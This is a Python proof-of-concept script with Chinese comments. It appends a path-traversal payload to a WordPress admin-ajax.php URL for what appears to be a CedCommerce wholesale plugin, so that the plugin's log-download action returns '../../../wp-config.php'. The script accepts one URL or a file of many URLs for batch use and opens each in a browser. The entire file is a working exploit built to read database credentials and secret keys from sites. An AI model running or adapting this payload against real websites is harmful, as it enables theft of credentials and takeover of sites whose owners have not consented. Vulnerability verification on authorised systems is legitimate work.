#!/usr/bin/env python3
import sys
import webbrowser
import os

def add_suffix(url):

    return url + 'wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php'

def open_url(url):

    new_url = add_suffix(url)
    print("打开网址：", new_url)
    webbrowser.open(new_url)

def open_urls_from_file(file_path):

    with open(file_path, 'r') as file:
        for url in file:
            open_url(url.strip())  # 去除行尾的换行符和空格

def main():

    print("这个脚本可以在输入的网址后面添加验证poc，支持直接输入url或者文本文档写入url批量执行，并在浏览器中打开。")

    if len(sys.argv) != 2:
        print("Usage: {} <url or file_path>".format(sys.argv[0]))
        sys.exit(1)

    user_input = sys.argv[1]

    # 如果用户输入的是一个存在的文件路径，则从文件中读取网址
    if os.path.isfile(user_input):
        open_urls_from_file(user_input)
    else:
        # 否则，假设用户直接输入的是一个网址
        open_url(user_input)

if __name__ == "__main__":
    main()